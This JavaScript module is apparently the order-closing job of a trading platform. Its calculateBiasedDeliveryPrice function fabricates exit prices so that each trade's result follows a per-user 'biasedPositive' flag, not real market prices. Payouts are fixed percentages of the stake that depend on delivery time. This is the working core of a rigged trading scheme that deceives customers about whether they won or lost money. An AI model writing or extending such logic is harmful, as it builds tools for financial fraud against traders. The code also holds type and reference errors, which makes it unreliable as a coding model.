import { ORDER_STATUSES } from '../db/schemas/Order';

function calculateBiasedDeliveryPrice(purchasePrice, currentPrice, isBiasedPositive, orderType) {
    const isLong = orderType === 'long';

    // Round purchase price to 2 decimals for comparison
    const roundedPurchase = parseFloat(purchasePrice.toFixed(2));
    const roundedCurrent = parseFloat(currentPrice.toFixed(2));

    // Determine if current price already gives desired outcome
    const currentPnLPositive = isLong ? roundedCurrent > roundedPurchase : roundedCurrent < roundedPurchase;

    // If current price already matches desired bias, use it as-is
    if (currentPnLPositive === isBiasedPositive) {
        return roundedCurrent;
    }

    // Small random adjustment (0.03 to 0.10)
    const smallAdjustment = parseFloat((Math.random() * 0.09 + 0.03).toFixed(2));

    let adjustedPrice;

    if (isBiasedPositive) {
        // Need positive PnL
        if (isLong) {
            // Long needs price > purchase, so increase slightly
            adjustedPrice = roundedPurchase + smallAdjustment;
        } else {
            // Short needs price < purchase, so decrease slightly
            adjustedPrice = roundedPurchase - smallAdjustment;
        }
    } else {
        // Need negative PnL
        if (isLong) {
            // Long needs price < purchase, so decrease slightly
            adjustedPrice = roundedPurchase - smallAdjustment;
        } else {
            // Short needs price > purchase, so increase slightly
            adjustedPrice = roundedPurchase + smallAdjustment;
        }
    }

    return parseFloat(adjustedPrice.toFixed(2));
}

export function defineDeliverOrder(agenda) {
    agenda.define('deliver order', async (job) => {
        const { orderId } = job.attrs.data;

        try {
            console.log(`[Agenda] Closing order: ${orderId}`);
            const Order = getModel('Order');

            const order = await Order.findById(orderId).populate([
                {
                    path: 'pair',
                    select: 'valueUsd baseAsset'
                },
                {
                    path: 'tradingAccount',
                    select: 'user',
                    populate: {
                        path: 'user',
                        select: 'trading.biasedPositive'
                    }
                },
            ]);

            if (!order) {
                console.error(`[Agenda] Order ${orderId} not found`);
                return;
            }

            if (order.status !== ORDER_STATUSES.OPEN) {
                console.log(`[Agenda] Order ${orderId} already ${order.status}`);
                return;
            }

            const isBiasedPositive = order.tradingAccount?.user?.trading?.biasedPositive;
            const currentPrice = order.pair.valueUsd;
            const deliveryPrice = calculateBiasedDeliveryPrice(
                order.purchasePrice,
                currentPrice,
                isBiasedPositive,
                order.type
            );

            const deliveryTime = `${order.deliveryTime.value}${order.deliveryTime.units}`.toLowerCase();

            const deliveryProfitMap = new Map([
                ['30s', 20],
                ['60s', 30],
                ['120s', 40],
                ['1h', 45],
                ['3h', 50],
                ['6h', 55],
                ['12h', 65]
            ]);

            const profitRange = deliveryProfitMap.get(deliveryTime);
            const fixedPnl = parseFloat(order.amountUsdt * profitRange / 100).toFixed(2);

            order.deliveryPrice = deliveryPrice;

            if (deliveryPrice > order.maxPrice) {
                order.maxPrice = deliveryPrice;
            }
            if (deliveryPrice < order.minPrice) {
                order.minPrice = deliveryPrice;
            }

            await order.save();

            const biasedPnL = isBiasedPositive ? fixedPnl : -fixedPnl;

            console.log(`[Agenda] Order ${orderId}: Entry ${order.purchasePrice}, Exit ${deliveryPrice}, PnL: ${biasedPnL.toFixed(2)}`);

            const { profitLoss, isProfit } = await closeOrder(orderId, biasedPnL);

            console.log(`[Agenda] ✅ Order ${orderId} closed. Final PnL: ${profitLoss} (${isProfit ? 'Profit' : 'Loss'})`);

        } catch (error) {
            console.error(`[Agenda] Error closing order ${orderId}:`, error);
            throw error;
        }
    });
}